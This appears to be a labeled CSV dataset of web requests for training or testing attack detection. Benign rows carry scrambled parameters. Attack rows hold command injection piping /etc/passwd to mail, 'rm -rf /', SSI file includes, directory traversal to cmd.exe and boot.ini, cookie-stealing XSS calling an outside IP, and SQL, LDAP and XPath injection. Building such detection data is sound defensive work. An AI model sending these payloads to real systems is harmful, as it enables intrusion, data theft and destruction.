Method,URI,Host-Header,Host,Label,Data
GET,/jseRtnruyceta/9i.u/tsfrw9masiebcnhg1nol/fRZy@XE.msf,HTTP/1.0,www.n4vhoiau.com,0,cilcafenir5eonh=ekf+&aEaeTt0nsey=whereshee&24VBystdiniframeformL=no&4Std=t.bcsCIGSNSb&NchildZPPsAShavingHw=lcAw&1nnn=ayht%2F&rjp=858095&O7cVdotisnimc=r8a0Zk&mcitvulzHisTz1k=36245456&5rtsngnleml=22071725&43vhSJI=0nrahhosee&bAdyfrob5n=rjl&dtodn=jEao&NaR=ahr
GET,/q8ctes3l2nfadniebr/0eNipn/e6yltT9helaoCee/kTc85_9.qjL5G/eCKasIhHHp6ibSW_N/d7aiisea/q1yPt/bKYkNo3-4u/Ud0gPacceptjDc.php3,HTTP/1.0,234.125.85.67,0,apu2eoasoas=4685&rsceno=05348&svtdoceoh=930772664&5jEt0e=524515&aFllO=1eilgismepiednneI6&ce=4cstd1das&iE=8&sqtmpGCIP=hlsYL4ec%25uygvGmochafr4ooe&presswnh=212065
GET,/shutdowndivH/c69VteI.tiff,HTTP/1.0,237.44.2.36,1,rgnahh=%3C%21--%23include+++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22+++++--%3E
GET,/fRp/0tcaleiee/nJBps/sE5XRHRxAm/jfCIOjrpR9KAox5ouV/O0xnnBySlqheI/mhleqspahs.mdb,HTTP/1.1,142.209.125.25:80,1,75hejsndizod=oops+%3B+cat+++%2Fetc%2Fpasswd+%7C+++mail+++your%40se5e.com
GET,/ilyir41jtrot4/lR2/znilnr/stgi1nnOds/lIN1cVV9pZmRmWEz/nK-XmqzxDA.pl,HTTP/1.1,www.e6barc.uk:95241,0,tofHw83usyeI=78010&DuN8telnetr=mesamrr+hp&sidnnratsrp=window.openkl5o3lkr&yEbmr=imOxp_thtbwgetadJ+&enleOetr=21077062&pavtu5ereruet=008400&ns8eAtdwcwhdoul=veBRBtR_o5Y&n8=z8%3Fe7&nsqc=engewEeeeetjnbl&V.1xzoT=iossphr&lwmaci=104570420&8swlerlbE70ewrN=8182091288&axBtoy6=aD%26systemsu&hkdi=98
GET,/SSrM./rD-/fbbEnzc5-.Ks_ZQng/spwH8YJe/eoR8tt0t/n0tzeNosorwsepA/dpYCx8Y.BMeR6EsQyVjK/pnw.FmT-w7p3iwPlW/lGFi0bgo/hCopPweszT1XBo9x9UL/wm2awNina.shtml,HTTP/1.0,39.121.182.158,0,rttunkra=a23aYgOwooe
GET,/Gh6.IT/lHx5v3PF/NN-WJA/ouEseareeCep/Rf/hEtxxlX/6b/egulh75nvn7.php,HTTP/1.1,www.ra9sNe.ch:80,1,mteeOcld=0&coe6I6n5i=feutn
GET,/gogiinEocqhbj/alhLkbS8ygCq@I-4fCNV.php,HTTP/1.1,www.wTaeEshi.org,1,XsoTnuheIe2Ge=%3C%21--++++%23odbc+++++statement%3D++++%22select+gdi%2C++++tra%2C+++nfieuiao++++from++++m1Pbs3os++order+++++by++++9%2C++++24%2C+++++0%22++--%3E&pa=ewl&astdeneciaoi=tkhbG&fsciwQO=q53Grz8
GET,/rtdt/Xa74/torueeef/OmLlm/slIcr/b8IKY-zmT-A3yUY/mW6C6yVugPDZ/ijR/9vp7cAnpE_.html,HTTP/1.1,94.132.60.112,0,discHtqWli=o%3Edse+iN9yndis8&imgYG%ux=zSiehuNdnet&eeatyr1A=nondho5sf0ul&iprsan=afieweiWekhtytoa&heeioht=671630&ays=e+t
GET,/9lmr.dll,HTTP/1.1,www.6dsarrt.de,1,Oe6eTTimylbosa=e5iev-tdZM&oall=hsReu&gmochaLVmlV@vPRQ=acxml&1Uon5imm=563&rneghe1ssrtid=lstdinvar&ghetekhdolHSst=03927&etgmmilrtr=dnoo&yqisSj=nzTo&dlii=ie+%3CeBe4ssat&ci3unE=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&wtelnetS7J.JEKkt=si%3B-an+oo
GET,/ereeropsenAeeotmho/im/Pyie8bnoridniGi3bsNf/aGXCnUeZyNYVPIq0t/oKorcvu8/ejWWr67iz_L0NsNbLT/opz2.mdb,HTTP/1.1,www.tcknA1n.uk,0,Se4=%7E%2F
GET,/Sn4p3Mmee/u18eisr3dnh0Eaei5/aJ3ZS1/bAopenipwindow.openavvQschild/8L/fwauyjsangt/nlIollesowhad/1bl/slm/ihxlNrieLbCtf8on5s/e1nfjjgBU_ZzG.mspx,HTTP/1.1,8.147.216.12,0,25_tje5gPk=tMxF2S.MDp&teSveswhDoiibn=tHt&arWneo=logo&Solljlu9r=7oegoibin&9RPvryBup-=Vinnoemn7&he-likeTinput=2+&mrrthss=nerycfoi%3Aso&sicy=7253424531&cmocha_26vc8od0dx=thsgqe&K1Ncat2=uiohlall+%2B+aari&nSl1htaa3id=df6&ir=00331
GET,/tyCTl70B9gUOBQwP/m7lseuiura1nesitue/enatEoiniee/3s6xJLNwmrV/woixhfubtmwaau/haeu/dwZFmEUmvK2yh50-BJ/5iucegsrfea.css,HTTP/1.0,141.150.243.9,1,jta6Eo=eaeytroai&remey=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&ooVfahh=1tzpmng5eo&javf=14
PUT,/ofztFJM4PE/mw.6DF.hkOkcoQr/dx@T/tWi7@WBFWbfmJl-n-C/eN8Xr./le59nsr4i5L50Uje1krn/erzCa5q_/dBdfPl@jPwt2641shZ/4ui/xccathhus/4DRsV.bKANEgroup by-.dll,HTTP/1.1,www.iihEtd.ch,1,GalEnj5no7vt=hpva&htaccesv2qnc=01281282&Ris=../../../../../../../../../WINNT/autoexec.bat&EvHidEea=zyreplaceo/ oercfrexIe&pe=dE7YVaopM.&tJrcpn=5
GET,/EtpmegidlATpsree2/yBevsainemdms/azwS/tnlia4iafltasefdqzl/IHRGHphavingsKwzQ/MCodvLeFzi/moiogtm/ENVIP2Q7sk_Vfy/ns1LZlg9uuN/a5mcHNc/p8PupUnDRe.aspx,HTTP/1.0,41.227.20.10,0,PE2I=25&dteopEeIxsrbyC=810505&laire5=v&4kwyrlecdeo=1uahax&9s-x.IOGea=800&erexc=cbVOu&nsraverLdh2hAd0=See3sihain8h1&tatst5ds5cO=tgEiNmoox&gue7i=11189695&d7=sof&-0EIoXpassthru-_=7&eitdinssegro=92751781&peeotebne=b%5Cj+
GET,/httpRAypcAP/oRQMh@N4wajU9/o3/laf/iVyuc8y/cccbYYnaoadtDe/bzpL93/aoyxu.bin,HTTP/1.0,www.mnqseutu5.cz:265,1,cniQWcMqdocumentWIv=851607&tesurn=3620030&hheEod4mhe=y84&15iei8tdS=03&gdihoeNnte=natMj4ntew&nu=Prsat8s&ednl=t%3Fh+dJe%5Da4ie&pahenmuus=ic2t&yrITrsE=8542522414&iS=772309&ALebetweenc=aooi&nw=7556496&rghRdaTjl5t7lmo=%29+%28++++%7C+%28+++cn%3D*o++%27brien*+%29%28mail++++%3D*o++++%27brien*+++%29
GET,/iURAV/JQAdelete7k/5yoIXS2A@G5lo-4HZ9qr/6YHdQsduB/o7b/aOYJbaNVF0Pr4A_45eE/ec6ho9huriEgH.php3,HTTP/1.1,www.irvwtonw7.gov:80,0,eru=980489&urhlqasr=t&eotuwippoehem=i%25cUnn&na=4765815&iSdg=2&tnoamki=272249&ihu94lo=passthrusyE&otna=tni&wt=oelezrtOs6aUoaWah
GET,/msadc/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe,HTTP/1.1,224.159.159.92:80,1,/c+dir
GET,/f7vNw2subygIj9/0p2pVFIeEPCbFmW2BM2.nsf,HTTP/1.1,www.oeoenni.org,1,eac27nevucofrt=1496
GET,/isahse9toea/mElxatWt1ieeoE/xp_fvy/orrlu2nsreaeespeu/.ETwj.js,HTTP/1.0,www.tbAdigp.ch:80,1,otn=%3Cbody+onload+%3D%22+%5Bwindow.open%28%27http%3A%2F%2F230.178.48.232%2Fta.swf%27%2Bdocument.cookie%29%3B%5D%22%3E&httrajooew=8123&ttg=521120823&slacwqi=eh
GET,/u0s4MQqcdQCRUC2S/reds2tcsprilatiroeee/cu2L-LFm4/mnpghiHpyz_qIb4v.2t/tva4eis86hhgN3f7.pl,HTTP/1.1,116.173.147.239:669,0,heso=1wr6iodbb&Slewaoneg=nZ9JavBV&qRdiap7ahaagi=e.J&MYfxZ9=npF7.-0fx2RT
GET,/CF_/bpjnc/amLqDnl/s7ut/mhTtuihn/at3cyi/pgoa8EleonulaeSTat0r/q9gcq@v3VWy/whereIl/system-fOvj4rcprG/4vOW1euguCFe.shtml,HTTP/1.0,254.38.47.102,1,IHKRLN-Ek=+&avonu0ow=107288&vqdJKt-YYE=7031+++++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++++89493%3D
GET,/3usiiZAe7eq/zwaxdhVuIYF3cHoA/czrNeq4C_bAE8ARg.pl,HTTP/1.1,www.3onnslIEo.gov,1,Oo0JI2G6wAicmd=%3C%21--+%23include+virtual%3D%22%2Fvar%2Flog%2Fhttpd%2Faccess.log%22--%3E&.F9baLeEq7execF=svMFYWNyB
GET,/h5ownhamlnem/hHUrcSJi3klpu0nt3uk6/RCS/tsmtU8v/osXTDKk/cid4fuetbiw/ahhoc/Kw14cesPu/eds4FTbnetbq.mdb,HTTP/1.1,www.lnwe62.org,1,6wnlnaasl=%29llogr5q&oTma7ti=gf6rEioLrco&kabseruwhbsgi=863&oXl1ij=od%7EenlUcfnhd%7Co&snsnp47tm=%3C%21--++++%23odbc+++++statement++%3D++%22select+++++c4so%2C+++ovosD%2C++tfsohir+++++from+++++tbtalse2+++++order+by+++++6%2C++++65%2C++5%22+++++--%3E&oum4i=aaeomhOs%25hisq&acetxssgSSdal7=0tordzamevalndd
GET,/fP9i3WngW1X33g/egXgItneXlJRsIkl/2QDMpidqk/aXuhfhrtsq1eedndt.php,HTTP/1.0,73.151.136.173,1,.TZK5PQidocumentc=u8lhoaReosort&ryPLn9OaYoC=290&iJwsrIfablet=gMq_SU8P.DX&en0bcv=8508&loP=389628287&i1aUSmutRAle=la8n&s5nOwndTnt=n6T%29&ktT=etcm+ep%3Ac+eiI&rofeuittashli=%27%29++UNION+++++ALL+++++SELECT++++01++++FROM++++oNr2t+WHERE++%28+%27%27%3D++%27&h3my=hkIcXWin&1winntrboot.iniNtzJ5W=962&i7=rilinkawylfromotng
PUT,/edogh/SshP85lCEmxI/tLyp.EH_m9S2/T4Bav.html,HTTP/1.1,76.102.92.166,1,bi=92&thueafteeRr2n=../../../usr/dsqqdsqsd.xml&Olpasswd.Ww.Bo=310&ofkhpe3s5yi=gQaMFIQI&d1LTy=0318219&tjr3hheio8hE=767&sPR8Z2r=c3mDx@@&AeqsRtnao=rosftrEs kel:ee&ee4cjoea=669
GET,/edohg/aBhsHBel5NIHUSRb0fnG/hkBSKuvRBQE/dBaeiaErenretlttraat/aensemlsnsduh0.php3,HTTP/1.1,www.aulddewh.it,1,Yw2ogqxya=s3soraht%27++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or++++%27hibo%27++++%3D+%27
GET,/eKl.@N.js,HTTP/1.0,102.241.119.13,1,evpiec=691&o2gia=acaconnect4&rEqubchsmlleht=+ssh&oiteaftsToiwre=tr&DZWAfYf.T=Ah+b8Ko3e%40i&tro=rdihat&winntcmdamailnEi9Te=ecrtwgetYi%25%7Ea6ohq&nst=44.225.165.193+++%7C++dir%2Bc%3A%5C&ni3tabplltc=f%2F+t&orsottnErct=WesjE
GET,/7q-upc2p/e1tran04hci/fnrE4drImfronsieeAmd/o8FjBWLq@.ewIfFBfV/zmOBo6b07bucf/nDM1uHRgFgfv.htm,HTTP/1.1,75.196.136.225:80,0,4ro=Elartne%29C+%3EE&lnisoohaSpu=694386&9aymn=fechoect&RqautoexecjPG9CS=654&jeGYJ=90603&st7nhzods=sz-Ao0j4ixPl&ixgehenz=cJSj.lYRc&aUxhD1Cj68=007288097
GET,/q96xkDZ9ENxE6nFF/ovanb2fz1s8axisdec/issOdrduyuaartOhitoo/iCIAQgwgu/eDWIeRk414fp/iT1rgsiG2WPyRZw1/ldqcMxbdL.dll,HTTP/1.1,104.117.189.173,1,T13pur@6uIchild=lLG&Uat19ucrbiclabr=t%5CtMqo1&ntoieit8octR=mEMs8PO-HX&telnetOuCl=htpasseboot.ini&eaDdtuuRStqeuId=%60++++rm+++-rf+++%2F+++++%60&yetsfeeci=94743&ohotNczyeik=likeis&7iwnuoeeade=0563176601&esw7edvPCe=6&iiIeuue=+atth
GET,/e0njioetf6t3ibt/nrc5itquxshso1hmzlld/1tTdesroaz6p/gaivz/aLdo9l9ogeb8e/1sttaamhimIbttlMs/7etilih2/tEpRterngeiraotaJzu.php4,HTTP/1.0,www.ahrl.it:98,0,aiatoHeeYreel=fs33662bZr&eeaaicn0eael=zg7o0bCXE&seo=dN2cd&akttog=woctcon9execf0d9n
GET,/b5itd/une/9script9frompHwbinsWOIlibA/iADwSqpu9B.-5h/51t84srna0Eivnr/PgqZnMNQoih/ttikyTperwerw/xVLY/r9/sae8tcadgxo.asp,HTTP/1.1,www.entotmAa.org:9207,0,bEJ=920
GET,/asPUKNCrnog/R40/le/yQICGYO/JservicesmbodyKEw/i170I/aomelAs8hointEa1oDuc.jsp,HTTP/1.0,26.16.182.51,0,toaotheedise=lpusre+%27prmsd0a+aeexecI
PUT,/lrIMPYtO_zlfO/lvsao/o9gftbA-J6tGzE9/6execIhttp9iX4EBJp/6tioa/qG9KGidbin/perxprwtmDior/oe/0ett8dejrm/tnoreo6hit0ysdi.jpg,HTTP/1.0,21.66.243.126:80,0,opNweip1stsh=btoootI&iu3hdesa0hyS=A&omb2lgs&aLaaucerdcp=as4&o3setha=6
POST,/m-vQijR5YHN/baeh/TQxm@UzPy.gif,HTTP/1.0,www.eempqx.org,1,ye=arEierneHm&JTFOUD=h7nyhalNn&oih4oot3moEo=<!--#email fromhost='www.repph0d.com' tohost='mailbox.krN7.com' message='s4iur OhnEt4 ltxeAeM i7h1s' fromaddress='ucetoT.com' toaddress='wrl5.vs.com' subject='o' s
GET,/eX40zFTSRKQ9Td/d66wTYVER2D2wOjL1o/ees2htTT4/_KExy5L07hs7R_/lSOaN0UyU./nkZd9eA.m7kwF@xjS01x/t9ps-LbpR.sh,HTTP/1.0,www.2EIifs.uk:09080,1,gr=1zas%2BhIimn8&tpGt=7980&rwxep=144&aeopus=wmmw&ynuDsEbrul0w=oeoscTc%27+++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or++%27lsd%27++++%3D++++%27&E.scriptvarKJ=su-&gb=etv0djouhkyr&ucie4ex5as=1et
POST,/ojNsD3stdin8vllocationU8/niatvrohE/hfZ/y7uUqPqA2A8pv.swf,HTTP/1.1,www.veuqlc.com:80,1,uJkO2Q=+sunnhoj&8q3h5wo=<!--     #include    virtual='/etc/passwd'     -->&id3ennoosExioic=72872&vrr=sElhq5 pghb|uaa s hn&q4fisnsu=056436&ulgntpmoAi=16905297&Vshutdown.fBxF2WU=h&r9fAiencnrD5=516973
GET,/sveneit2rqK/u6SIyd-Qo-.tiff,HTTP/1.0,www.csoazsrwto.uk,1,ntjoa3Ax=eanga1isyhhtot0&lbmt=et&ir=i&lhafuosman=arestMnoeurt4&KG7iCxBqd=oGJeKaHq8&cnr7wnesa=8TpD2ixTdu&W@acceptEqESvE8httpk=Unph-gfi7%3ChIparw&ngbd=icxaYL&mQfn9ecOcse=%29++++%28%7C%28cn%3D*o+%27brien*%29%28mail+++%3D*o++++%27brien*+%29++&ntenourh=y
GET,/msadc/..%5c../..%5c../..%5c/../../../winnt/system32/cmd.exe,HTTP/1.1,80.192.141.18,1,/c+dir
GET,/evhriIie2etbdtt/Vs03aUYaD.9/set/t7/i45n/i9uLyD5.STzeweW1cQG9/cIyrIiz@PhR0XYws6c/teE8tcherae/9inhsizsltkheorrir/nNqqK34tV1YB16/oiften/zVUX9hQ66b.asp,HTTP/1.0,www.hsml.be,0,hDih8uvzrTcqget=inputna+c
GET,/drk/larbs/_Dusrginclude/sj6GriYWI8K3/pHd9ekl7_15EjctfR9Z/i0iI3YOOOw2-8aYWh/erMqhy3swidileeh2an/eRU.vUHcH25/aGtgete1sgtAld2a/unssEnesjc/lst1ozasa/ynUin.mdb,HTTP/1.0,www.Tlrtn3.fr,1,sottugi3aykeoa=40919614&loghA=%3Cimg+++++src++%3D%22+++++javascript%3A++%5Balert+++%28%27R5ls%27%29%3B%5D%22++%3E&uw=dtmealttP&eerraTlIoea=feiBjogfka8aeWeie&yrsawaunRj=oiEzq&FHcgroup byJUQpasswdK=eetnnpa&n7le=%26i%7Eohaving&boqiadht5qyc=rFGwQOszfIL6&mno=xtermaoei
GET,/ndaoht/yLrt5zly0oq/mhFucmlAsns.htm,HTTP/1.0,www.sqr4shd.uk:80,0,8NFULIBVjFIi=nHlep2srhIeu&6te2eThumsonnee=0797616&aeiq9K=yK9E&SdeutsY8=whTwsmwt&l3oi=2595305&tecYqylaa=o4qastpOu%28i%5B+processing-instruction%2FRtm&HhIG=ea%3Dvniiiofe1%7E&lthel=cc1ecsctm4d5Dt8&0sxrttry=ehaechooztlsl&JUvDmadminmopeny0dFp=5279&46ieesWct=4%27epte
GET,/ozdh1yecwnxwnorjorn/u6eane8ti/tg7.jpeg,HTTP/1.1,www.ncn7.be:80,0,iwp-WKdocument=aowinzutowN3nuA0e&nlatf=3&mNt=9626842
GET,/isdl1fqIoDnOsomosgs/fH1B/c.6FiPmLHpj9xP.pl,HTTP/1.0,www.ilrsm4.ch:80,1,xh3=492985&eymnmeiz=aao&Mo=7&7baeFl=t6v&mmatnnwoshhd=rge5sdorrTsr&etH=hs&ssosea9=ebn5&zH4T=geS4e+%22+++++++++style%3Dleft%3Aexpression%28alert+%28%22+++eeic.Hd%22%29%29++alt+++%3D+%22&eyIs=tYA&xeyighdcw=31575062&liiej6s=oUfrS&de=8906247924&ce2sLdcAn926b=nssteKboIeijh&33aomncaOmee=eezUgdaeys%2Beua
GET,/Xanmmaa2.html,HTTP/1.0,www.sg0wT90u.ch,1,afa=dtl%29%28%26%28objectClass+++%3Didd*%29
GET,/bc/emCURE0ME8k/dytNo0mBlbllx7d5/s4xuG2zRvxNP/pWOp3kaccess_logLVX/sbE3Ndk94tG2nY/kEa8/iuttltdliora7ed/iy1nlX4nniltaso/nIThfdoc3a/c@RWBlE2_XVOfH2Ol2W8/AQLnph-WGSH7.htm,HTTP/1.1,www.oeIOmish.st,1,Ari5cttahe=6185&blsees5lNraaio=t&Te1srep7ejh=enPSCo-rIW5&sacoe2enF=%2B1adircaa%7Ces6systemrn%5Csbt&nntttokhTas=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F5469%2F**%2FFROM%2F**%2FseSinedsk%2F**%2FWHERE%2F**%2F%28++++%27%27++%3D+++%27+%2F**%2F&ylegammei=071&iitllshttue=phi&n0b=OFtniot
GET,/u.BF/ms/rWm.Hjx/aegrseqrnisogOdetu/rWenhuA9aidteeaiwo.jpg,HTTP/1.1,www.wdrkao.uk,1,28IYDHSJwhere=teemmiEeoegcadteu&REAB=ea+hadmin&1bzstdin=nd%5C&if=latEtneseya8rdaPMi&ndlraa=60&lccgdjrtlS9h=5&pilw=siepd76ydwwieeo&Tk7c9=jtpssajeeye-O&FessEB=w&YZzS=503045&yonagbtud04ti=%3Cimg++++src%3D++%22++mocha%3A%5Balert++++%28%27at%27%29%3B%5D++%22%3E&srrhnTttsewdmn=vbscriptrnph-smet
GET,/positionservices-obdLbdoPjp/wHPT/2QtlP27k.pmFze3WC/5hLsQZMQjk032u6ypG/dJ2URTdt2GqePM50.DNG/hiShBb3mykzJkz/khavingcl1VlXS4B/8her/ai2reusrc7eorul99n/br@JFosYdWxc.c1X/tEz7eR2WspgrxThQbY.jsp,HTTP/1.1,204.106.119.2,1,qe3b=4cZoyZzPfwNx&kS=hsi+u&hf4lzNgtnHamgTa=i-emfofeesttos%28&uauwsnestNExs=4717345&fej=5+positionore5v%3E%29+a&Esab=0&fchesdtofs=%29%28++++%7C+%28+++cn%3D*o++++%27brien*++++%29%28mail%3D*o++%27brien*+%29&DdclydMg=hrw7nIseeIt&negrrrhusF=zmocha&tgfa=i5rb&e7eerhtsdo3tlo=m
GET,/oeeegux/tQG3cgwV0Y/8node-/eO/hhu@PbSV/antzemha/5N/mrFzxqN/aZQN/mhIv5eeof0aiUunai.mdb,HTTP/1.1,www.Enalsasaep.com,1,crli=8LZbg_2MVH&itzdadAp=o3Qc-kxcGB&dtfrlo=%3Cbgsound+++++src++++%3D+%22++++javascript%3A+++%5Balert++++%28%27zowlmN%27%29%3B%5D+%22%3E&efy=esetccdnullevbscript+eog%25e%7Co%26r%3Ee&nOAlMB_SD=uare
GET,/u0ofcIk9/g5bpHPz0BI-WBh/9cEOrpnk6m2d5aR/b6okUfd.S.jsp,HTTP/1.0,www.hluaahhie.st:80,0,ciyr1=oedoinetcatwtarukt&naEBcs=os&iUarajrrransjn=tEp-BBj&mhai3o=2
GET,/aJ6_oJ5gZO@gOGOpu.nsf,HTTP/1.0,29.36.241.1,0,b3Hh-@jMadminPDw=rlsstwl8ouqqoatiai&UIzhnoinal7ttbE=8&hbixmuch=3051
GET,/ealtjsefetste2b/Ipt/adWhPqidpy-7J/eetehtfex/9mjdI4uLxT/n4aatysweh7Lerqistu/e1/tAykxCQz9nX/eu/nk942Er0b6wmss/yltesol13v.shtml,HTTP/1.1,41.214.239.12,0,oae34eratc0E=2ydi&9echoLetcxGdf=nth9&_m-oRq82b=mQtcoFbZvgoK&7cUip=9381591
GET,/nh@U2catL6h/susiCTcrdtNRpttrhhz/eCd.OaBt-rXptnCGr/oLeoeKGe/aDkBxwuWY94/XJcatiNOO/h.YT.js,HTTP/1.0,www.slefeete.ch,1,i4rsteDasonc=ds&qfowrE0vE=igv&i2jeefmurI=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Flaelmerich%2Fastons%2Felol%2Fng.nsf&2ra=tAfDTnandh+T&fisusblhyznax6b=eig%3DrImoW&lhTpEOpedl=sMW
PUT,/tcuvroeDdQgtZWpJOOUJ/konmw/eebntnsiffrrk8ho/Oy/cYwZJM3pLbody/tdIHEm.php,HTTP/1.0,215.229.162.107,0,estftxt=fJg&Hwceeuesse=53544&opaoa0npu=oGh4U61&ihIlidyegr5pO=ugx&B.Uas=66813982&nCLVUhome8p-=neunionyaEi4&nsn=uZQ@zIHGLTru&8qnr4B0=rr'an9elle&7X3or.LNGobz=xb&oih-=9hitcRUeuld1h&1Oal9eqOApdTesG=1&Htrnro0otry1x=itrennmeneoy&MzJETzo= veI|dre0mcmdnhttpt<&geet8nFlyotm=aa pfcopyitescripteteob&replaceinsert.wgetgHPMdivi-=keuo6sstnm
GET,/LqMc20rV6/ex8s25/vB/4_qHqqNXBKSjc/Cjxc/tbqfpXO/0YHD_8/mUO/mfcaonC395/ui.php4,HTTP/1.1,178.59.78.172,0,wemUrraorpe=eil&5t=2&TrisAaa=828103&abAtelnetP4BpvpZ=-Sue
GET,/zMaGdM1ZFKqq0d/Z89t8Dvfvw/passwdhU7zHGms/WV_sbF.m-saccess_log/euirogaEl2oeooinvoa/u0sgiuQi1iacwtia2odr/s9S-nKRPg@A/sw7lis/eoaoulr.swf,HTTP/1.1,www.oemFmflM.it,0,8vei=i9aatFtneutom&YzmN2c63=794638&arppzb2e6lrV=tq&ltt3tb=x4_Kgp&09Yqh=idl
